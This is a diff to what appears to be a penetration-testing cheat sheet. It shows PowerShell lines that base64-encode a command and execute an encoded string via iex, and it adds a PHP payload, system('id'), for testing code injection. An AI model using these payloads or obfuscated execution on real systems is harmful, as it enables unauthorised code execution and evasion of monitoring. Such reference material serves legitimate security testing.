@@ -83,3 +83,9 @@
 | **Encoded Commands**                                                                                         |                                          |
 | `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64              |
 | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string               |
+
+The following snippet can be used to test for code execution. #Injections 
+```php
+<?php system('id'); ?>
+```
+
